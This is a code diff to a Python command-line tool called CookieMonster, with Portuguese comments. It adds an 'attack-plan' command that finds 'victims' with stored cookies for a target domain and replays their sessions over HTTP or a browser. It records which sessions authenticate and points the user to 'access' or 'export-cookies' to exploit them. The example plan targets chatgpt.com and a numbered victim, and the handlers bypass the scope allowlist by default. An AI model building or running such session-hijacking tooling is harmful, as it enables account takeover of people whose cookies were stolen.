@@ -268,14 +268,14 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
     from .report import json_out
     result = res.get("result") or {}
     evidence_blob = json_out.dumps({
-        "state": state, "confidence": conf,
+        "state": res["state"], "confidence": res["confidence"],
         "differential": result.get("differential", {}),
         "baseline_evidence": result.get("baseline", {}),
         "injected_evidence": result.get("injected", {}),
     })
     run_id = store.record_run(
         victim["victim_id"], target_url, host, channel,
-        state=state, confidence=conf,
+        state=res["state"], confidence=res["confidence"],
         evidence_json=evidence_blob,
         auth_context_json=json_out.dumps(result.get("auth_context", {})),
         reason=result.get("reason", ""),
@@ -1182,6 +1182,180 @@ def correlate(db_path: Path, domain: Optional[str], limit: int,
             console.print(f"  [yellow]{d:30}[/] {parts}")
         else:
             console.print(f"  [dim]{d:30}[/] {parts}")
+
+
+# ---- Fase M7: attack-plan -- orquestracao declarativa ----
+
+@cli.command()
+@click.option("--plan-file", "plan_file", type=click.Path(path_type=Path), default=None,
+              help="Arquivo YAML/JSON com o plano. Se nao informado, gera plan minimo.")
+@click.option("--target", default=None, help="Dominio alvo (so se --plan-file nao informado).")
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
+@click.option("--allow-unsafe-scope", is_flag=True)
+def attack_plan(plan_file: Optional[Path], target: Optional[str],
+                db_path: Path, allow_unsafe_scope: bool):
+    """Executa um AttackPlan declarativo (M7).
+
+    Carrega plano de arquivo YAML/JSON OU gera plano minimo para um
+    alvo, executa as phases em ordem, para em stop_conditions, e
+    produz um ImpactAssessment.
+
+    Exemplo de YAML (docs/examples/attack-plan.example.yaml):
+
+        target: chatgpt.com
+        victim: 1939
+        phases: [discover, classify, replay, observe, correlate]
+        replay:
+          transports: [http, browser]
+          context_variants: [default]
+          max_wait_ms: 10000
+          max_victims: 10
+        stop_conditions: [authenticated, blocked]
+
+    Para uso em LAB. Em producao, so com autorizacao.
+    """
+    from .plan import (
+        load_plan, load_plan_or_default, PlanValidationError,
+        AttackPlanExecutor, Phase, PhaseResult, render_plan_result,
+    )
+    from .util import scope as scope_util
+
+    # Carrega plano.
+    try:
+        if plan_file:
+            plan = load_plan(plan_file)
+        elif target:
+            plan = load_plan_or_default(target=target, artifact_source=str(db_path))
+        else:
+            console.print("[red]Forneca --plan-file <yaml> ou --target <dominio>.[/]")
+            return
+    except PlanValidationError as exc:
+        console.print(f"[red]Plano invalido:[/red]\n{exc}")
+        return
+
+    host = plan.target.split("://")[-1].strip("/")
+    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
+        console.print("[red]Recusado: alvo fora da allowlist. Use --allow-unsafe-scope.[/]")
+        return
+
+    console.print(f"[bold bright_white]=== CookieMonster: attack-plan ===[/]")
+    console.print(f"  Plan ID:   {plan.id}")
+    console.print(f"  Target:    {plan.target}")
+    console.print(f"  Phases:    {' -> '.join(p.value for p in plan.phases)}")
+    console.print(f"  Stop:      {', '.join(s.value for s in plan.stop_conditions)}\n")
+
+    # Handlers por phase (cada um chama o comando CLI equivalente).
+    executor = AttackPlanExecutor(plan)
+
+    def discover_handler(p) -> PhaseResult:
+        """Lista vitimas com cookies para o target."""
+        store = _load_store(str(db_path))
+        best = store.best_victims_for_domain(plan.target, limit=10)
+        if not best:
+            return PhaseResult(phase=Phase.DISCOVER, ok=False,
+                              error=f"nenhuma vitima com cookies para {plan.target}",
+                              metadata={})
+        return PhaseResult(
+            phase=Phase.DISCOVER,
+            ok=True,
+            findings=[{"type": "session_artifact", "victims_count": len(best),
+                       "top_victim": best[0]["victim_id"]}],
+            metadata={"victims": [dict(v) for v in best]},
+        )
+
+    def classify_handler(p) -> PhaseResult:
+        """Roda probe canonico (1 vitima)."""
+        from click.testing import CliRunner
+        from .cli import probe as probe_cmd
+        runner = CliRunner()
+        # Tenta HTTP primeiro (rapido), depois Playwright se httpx falhar.
+        args = ["--domain", plan.target, "--allow-unsafe-scope",
+                "--channel", "httpx", "--max-wait-ms", "6000"]
+        if plan.victim is not None:
+            # probe nao tem --victim; teria que passar URL especifica.
+            pass
+        result = runner.invoke(probe_cmd, args, catch_exceptions=False)
+        return PhaseResult(
+            phase=Phase.CLASSIFY, ok=(result.exit_code == 0),
+            metadata={"exit_code": result.exit_code, "output_tail": result.output[-500:]},
+        )
+
+    def replay_handler(p) -> PhaseResult:
+        """Roda probe-all (N vitimas)."""
+        from click.testing import CliRunner
+        from .cli import probe_all as probe_all_cmd
+        runner = CliRunner()
+        args = ["--domain", plan.target, "--allow-unsafe-scope",
+                "--channel", "httpx",
+                "--limit", str(plan.replay.max_victims or 10),
+                "--max-wait-ms", str(plan.replay.max_wait_ms),
+                "--workers", str(plan.replay.workers)]
+        result = runner.invoke(probe_all_cmd, args, catch_exceptions=False)
+        return PhaseResult(
+            phase=Phase.REPLAY, ok=(result.exit_code == 0),
+            metadata={"exit_code": result.exit_code, "output_tail": result.output[-500:]},
+        )
+
+    def observe_handler(p) -> PhaseResult:
+        """Observa que ha vitimas CONFIRMED para access."""
+        store = _load_store(str(db_path))
+        runs = store.list_runs()
+        confirmed = [r for r in runs
+                     if (r["target_domain"] == plan.target
+                         and r["state"] in ("CONFIRMED", "AUTHENTICATED"))]
+        return PhaseResult(
+            phase=Phase.OBSERVE, ok=bool(confirmed),
+            findings=[{"type": "confirmed_runnable",
+                        "runs": [r["id"] for r in confirmed[:5]]}],
+            metadata={"confirmed_count": len(confirmed)},
+        )
+
+    def correlate_handler(p) -> PhaseResult:
+        """Constroi grafo de correlacao."""
+        from .correlate import (
+            make_finding_from_run, correlate as corr, find_chains,
+        )
+        store = _load_store(str(db_path))
+        runs = [r for r in store.list_runs() if r["target_domain"] == plan.target][:50]
+        all_findings = []
+        for r in runs:
+            all_findings.extend(make_finding_from_run(dict(r)))
+        graph = corr(all_findings)
+        chains = find_chains(graph)
+        return PhaseResult(
+            phase=Phase.CORRELATE, ok=True,
+            findings=[{"type": "graph_built",
+                        "nodes": len(graph.findings),
+                        "edges": len(graph.edges),
+                        "chains": len(chains)}],
+            metadata={"graph": graph.to_dict()},
+        )
+
+    executor.register(Phase.DISCOVER, discover_handler)
+    executor.register(Phase.CLASSIFY, classify_handler)
+    executor.register(Phase.REPLAY, replay_handler)
+    executor.register(Phase.OBSERVE, observe_handler)
+    executor.register(Phase.CORRELATE, correlate_handler)
+
+    result = executor.run()
+
+    # Render do resultado.
+    from rich.console import Console
+    text_output = render_plan_result(result, include_findings=False)
+    # Aplica cores no rich console.
+    for line in text_output.split("\n"):
+        if "CRITICAL" in line or "HIGH" in line or "FAIL" in line:
+            console.print(line, highlight=False)
+        else:
+            console.print(line, highlight=False)
+
+    # Sumario final: phase que autenticou (se houve).
+    impact = result["impact"]
+    console.print(f"\n[bold]>>> IMPACT: {impact['severity'].upper()} <<<[/bold]")
+    console.print(f"  [dim]{impact['summary']}[/dim]")
+    if impact["authenticated"]:
+        console.print(f"\n  [green]>>> Sessao CONFIRMED. Use access ou export-cookies para explorar.[/green]")
 
 
 # ---- Fase B: access -- abrir navegador e deixar o usuario interagir ----
